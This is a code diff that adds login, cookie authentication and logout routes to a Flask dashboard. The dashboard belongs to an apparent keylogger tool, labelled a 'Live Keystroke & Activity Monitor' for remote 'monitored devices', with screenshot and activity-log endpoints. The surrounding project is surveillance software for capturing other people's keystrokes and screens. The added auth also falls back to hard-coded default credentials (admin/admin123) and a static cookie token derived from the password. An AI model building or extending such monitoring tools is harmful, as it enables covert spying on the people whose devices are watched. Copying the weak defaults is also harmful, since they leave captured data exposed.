@@ -14,6 +14,8 @@ except Exception:
 import uuid
 import random
 import secrets
+import hashlib
+import hmac
 from datetime import datetime, timezone
 
 # Try imports for headless server compatibility (Render)
@@ -35,7 +37,7 @@ except ImportError:
 
 import base64
 import urllib.request
-from flask import Flask, jsonify, send_from_directory, render_template_string, request
+from flask import Flask, jsonify, send_from_directory, render_template_string, request, redirect, Response, make_response
 from dotenv import load_dotenv
 
 # Change working directory to the directory of this script to avoid writing to C:\Windows\system32
@@ -476,6 +478,215 @@ def is_text_noise(text):
 # State variables for periodic capture optimizations
 last_logged_window = ""
 has_new_activity_since_last_capture = False
+
+# ==================== DASHBOARD AUTHENTICATION & LOGIN ====================
+DASHBOARD_USER = os.getenv("DASHBOARD_USER", "admin")
+DASHBOARD_PASS = os.getenv("DASHBOARD_PASS", "admin123")
+
+def get_auth_cookie_token():
+    return hashlib.sha256(f"mstool_auth:{DASHBOARD_USER}:{DASHBOARD_PASS}".encode()).hexdigest()
+
+def is_dashboard_authenticated():
+    cookie_token = request.cookies.get("mstool_auth")
+    if cookie_token and hmac.compare_digest(cookie_token, get_auth_cookie_token()):
+        return True
+    auth = request.authorization
+    if auth and auth.username == DASHBOARD_USER and auth.password == DASHBOARD_PASS:
+        return True
+    return False
+
+LOGIN_HTML = """<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In - MY HOME MY RULE</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-base: #090d16;
+            --bg-card: #111827;
+            --bg-input: #0b1120;
+            --border: #1f293d;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --accent: #2563eb;
+            --accent-hover: #1d4ed8;
+            --live: #10b981;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body {
+            background-color: var(--bg-base);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+            background-image: radial-gradient(circle at 50% 20%, rgba(37,99,235,0.15) 0%, transparent 60%);
+        }
+        .login-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            width: 100%;
+            max-width: 400px;
+            padding: 2.25rem;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
+        }
+        .logo-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: rgba(37, 99, 235, 0.1);
+            border: 1px solid rgba(37, 99, 235, 0.25);
+            padding: 0.3rem 0.75rem;
+            border-radius: 9999px;
+            font-size: 0.75rem;
+            color: #60a5fa;
+            font-weight: 600;
+            margin-bottom: 1.25rem;
+        }
+        .live-dot {
+            width: 6px;
+            height: 6px;
+            background-color: var(--live);
+            border-radius: 50%;
+            display: inline-block;
+            box-shadow: 0 0 6px var(--live);
+        }
+        h1 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            margin-bottom: 0.35rem;
+            color: var(--text-main);
+        }
+        p.subtitle {
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            margin-bottom: 1.75rem;
+        }
+        .form-group {
+            margin-bottom: 1.25rem;
+        }
+        label {
+            display: block;
+            font-size: 0.82rem;
+            color: var(--text-muted);
+            margin-bottom: 0.4rem;
+            font-weight: 500;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 0.75rem 1rem;
+            color: var(--text-main);
+            font-size: 0.95rem;
+            outline: none;
+            transition: all 0.2s;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.25);
+        }
+        .btn-submit {
+            width: 100%;
+            background: var(--accent);
+            border: none;
+            color: #ffffff;
+            padding: 0.8rem;
+            border-radius: 8px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 0.5rem;
+            box-shadow: 0 4px 14px rgba(37, 99, 235, 0.4);
+        }
+        .btn-submit:hover {
+            background: var(--accent-hover);
+        }
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .error-msg {
+            display: none;
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.25);
+            color: #f87171;
+            padding: 0.65rem 0.9rem;
+            border-radius: 8px;
+            font-size: 0.82rem;
+            margin-bottom: 1.25rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <div class="logo-badge">
+            <span class="live-dot"></span>
+            SECURE DASHBOARD GATEWAY
+        </div>
+        <h1>MY HOME MY RULE</h1>
+        <p class="subtitle">Enter credentials to access the activity monitor</p>
+
+        <div id="error-box" class="error-msg"></div>
+
+        <form id="login-form" onsubmit="handleLogin(event)">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" placeholder="admin" required autofocus autocomplete="username">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="••••••••" required autocomplete="current-password">
+            </div>
+            <button type="submit" id="submit-btn" class="btn-submit">Sign In</button>
+        </form>
+    </div>
+
+    <script>
+        async function handleLogin(e) {
+            e.preventDefault();
+            const btn = document.getElementById('submit-btn');
+            const errBox = document.getElementById('error-box');
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+
+            btn.disabled = true;
+            btn.innerText = 'Signing in...';
+            errBox.style.display = 'none';
+
+            try {
+                const res = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+                const data = await res.json();
+                if (res.ok && data.status === 'success') {
+                    window.location.href = '/';
+                } else {
+                    errBox.innerText = data.error || 'Invalid username or password.';
+                    errBox.style.display = 'block';
+                    btn.disabled = false;
+                    btn.innerText = 'Sign In';
+                }
+            } catch (err) {
+                errBox.innerText = 'Network error. Please try again.';
+                errBox.style.display = 'block';
+                btn.disabled = false;
+                btn.innerText = 'Sign In';
+            }
+        }
+    </script>
+</body>
+</html>
+"""
 
 HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="en">
@@ -1114,9 +1325,15 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 <h1>MY HOME MY RULE</h1>
                 <p style="color: var(--text-muted); font-size: 0.9rem; margin-top: 0.25rem;">Live Keystroke & Activity Monitor - Monitored Devices Overview</p>
             </div>
-            <div class="live-status">
-                <span class="live-dot" style="background-color: var(--live); box-shadow: 0 0 8px var(--live); animation: pulse-dot 2s infinite;"></span>
-                ACTIVE MONITOR
+            <div style="display: flex; align-items: center; gap: 0.75rem;">
+                <div class="live-status">
+                    <span class="live-dot" style="background-color: var(--live); box-shadow: 0 0 8px var(--live); animation: pulse-dot 2s infinite;"></span>
+                    ACTIVE MONITOR
+                </div>
+                <a href="/logout" style="color: var(--text-muted); font-size: 0.8rem; text-decoration: none; padding: 0.35rem 0.75rem; border: 1px solid var(--border); border-radius: 6px; display: flex; align-items: center; gap: 0.35rem; transition: all 0.2s;" title="Sign out of dashboard">
+                    <svg style="width: 14px; height: 14px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path></svg>
+                    Logout
+                </a>
             </div>
         </header>
         
@@ -1191,6 +1408,10 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     <svg style="width:14px;height:14px;" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 1121.21 4.79M9 9h9v9"></path></svg>
                     Refresh
                 </button>
+                <a href="/logout" style="background-color: var(--bg-card); border: 1px solid var(--border); color: var(--text-muted); padding: 0.4rem 0.8rem; border-radius: 6px; text-decoration: none; display: flex; align-items: center; gap: 0.35rem; font-size: 0.85rem; font-weight: 600; transition: all 0.2s;" title="Sign out of dashboard">
+                    <svg style="width:14px;height:14px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path></svg>
+                    Logout
+                </a>
                 <div class="live-status">
                     <span class="live-dot" id="detail-live-dot"></span>
                     <span id="detail-live-status-text">LIVE CONNECTED</span>
@@ -2734,6 +2955,54 @@ def parse_logs(date_str):
             logs.append(current_entry)
             
     return [log for log in logs if log.get("timestamp")]
+
+# ==================== DASHBOARD AUTHENTICATION MIDDLEWARE & ROUTES ====================
+@app.before_request
+def require_dashboard_auth():
+    # 1. Allow login endpoints and static assets
+    if request.path in ['/login', '/api/login']:
+        return None
+    if request.path.startswith('/static/'):
+        return None
+    # 2. Allow client endpoints (authenticated with X-Device-Token or OTP)
+    if request.path.startswith('/api/client/'):
+        return None
+
+    # 3. Check if request is authenticated
+    if not is_dashboard_authenticated():
+        if request.path.startswith('/api/') or request.path.startswith('/screenshots/'):
+            return jsonify({"error": "Unauthorized. Dashboard login required."}), 401
+        return redirect('/login')
+    return None
+
+@app.route('/login', methods=['GET'])
+def login_view():
+    if is_dashboard_authenticated():
+        return redirect('/')
+    return render_template_string(LOGIN_HTML)
+
+@app.route('/api/login', methods=['POST'])
+def api_login():
+    data = request.json or {}
+    username = (data.get("username") or "").strip()
+    password = data.get("password") or ""
+    if username == DASHBOARD_USER and password == DASHBOARD_PASS:
+        resp = jsonify({"status": "success"})
+        resp.set_cookie(
+            "mstool_auth",
+            get_auth_cookie_token(),
+            max_age=30 * 86400,  # 30 days
+            httponly=True,
+            samesite="Lax"
+        )
+        return resp, 200
+    return jsonify({"error": "Invalid username or password"}), 401
+
+@app.route('/logout', methods=['GET'])
+def logout_view():
+    resp = redirect('/login')
+    resp.delete_cookie("mstool_auth")
+    return resp
 
 @app.route('/')
 def index():
